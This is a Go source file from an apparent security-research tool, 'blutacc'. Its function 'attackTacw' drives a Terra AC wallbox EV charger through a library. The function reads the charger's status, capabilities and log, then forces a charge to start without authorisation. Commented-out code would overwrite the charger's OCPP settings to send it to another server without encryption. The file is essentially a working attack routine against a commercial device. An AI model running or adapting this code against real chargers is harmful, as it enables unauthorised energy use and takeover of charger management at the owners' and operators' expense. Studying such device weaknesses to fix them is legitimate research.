package main

import (
	"errors"
	"fmt"
	"github.com/duckfullstop/blutacc/pkg/terraformer"
	"log"
	"strconv"
)

func attackTacw(acw *terraformer.TerraACWallbox) (err error) {
	//err = acw.CmdSetCapacity(terraCapacityConfig{})
	//if err != nil {
	//	log.Fatalf("🙅 Failed to read log: %s", err)
	//}

	data, err := acw.CmdRequestStatus()
	if err != nil {
		return errors.New(fmt.Sprintf("failed to read charger status: %s", err))
	}
	log.Printf("🔌 Charger status: %x", data)

	caps, err := acw.CmdCheckCapacities()
	if err != nil {
		return errors.New(fmt.Sprintf("failed to read log: %s", err))
	}
	log.Printf("Charger reports following capabilities:\n"+
		" - Free Vend: %s\n"+
		" - External Cards: %s\n"+
		" - External Access: %s\n",
		strconv.FormatBool(caps.FreeVend),
		strconv.FormatBool(caps.ExternalCards),
		strconv.FormatBool(caps.ExternalAccess),
	)

	data, err = acw.CmdRequestLog()
	if err != nil {
		return errors.New(fmt.Sprintf("failed to read log: %s", err))
	}
	// log.Printf("🪵️ Log: %s", string(hex.EncodeToString(data)))

	//data, err = acw.CmdRequestOcppConfig()
	//if err != nil {
	//    return errors.New(fmt.Sprintf("failed to read OCPP config before attempting write: %s", err))
	//}
	//log.Printf("⚙️ OCPP config before write: %s", string(data))

	err = acw.CmdStartCharge()
	if err != nil {
		return errors.New(fmt.Sprintf("failed to start charger: %s", err))
	}
	log.Printf("⚡️ Forced charge to start")

	data, err = acw.CmdRequestStatus()
	if err != nil {
		return errors.New(fmt.Sprintf("failed to read charger status: %s", err))
	}
	log.Printf("🔌 Charger status: %x", data)

	//err = acw.CmdWriteOcppConfig(
	//	"{\"socket_a_enable\": [17, 1], \"server_a_ip_address\": [17, \"10.10.0.156\"], \"server_a_port\": [17, 6277], \"server_a_protocol\": [17, \"OCPP\"], \"protocol_a_version\": [17, \"1.6\"], \"encrypted_a\": [17, 0]}")
	//if err != nil {
	//	log.Fatalf("🙅 Failed to write OCPP config: %s", err)
	//}

	//err = acw.CmdWriteOcppData()
	//if err != nil {
	//	log.Fatalf("🙅 Failed to write OCPP config: %s", err)
	//}

	//data, err = acw.CmdRequestOcppConfig()
	//if err != nil {
	//	log.Fatalf("🙅 Failed to read OCPP config: %s", err)
	//}
	//log.Printf("⚙️ OCPP config after write: %s", string(data))

	return
}
